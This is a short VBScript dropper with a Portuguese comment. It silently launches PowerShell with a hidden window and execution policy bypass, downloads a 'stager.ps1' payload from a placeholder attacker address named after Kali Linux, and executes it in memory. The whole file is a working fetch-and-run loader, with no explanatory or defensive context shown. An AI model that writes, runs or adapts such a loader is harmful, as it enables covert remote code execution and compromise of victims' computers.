Set objShell = CreateObject("WScript.Shell")
' Executa o PowerShell de forma totalmente invisível
url = "http://IP-DO-KALI/stager.ps1"
cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('" & url & "')"""
objShell.Run cmd, 0, False
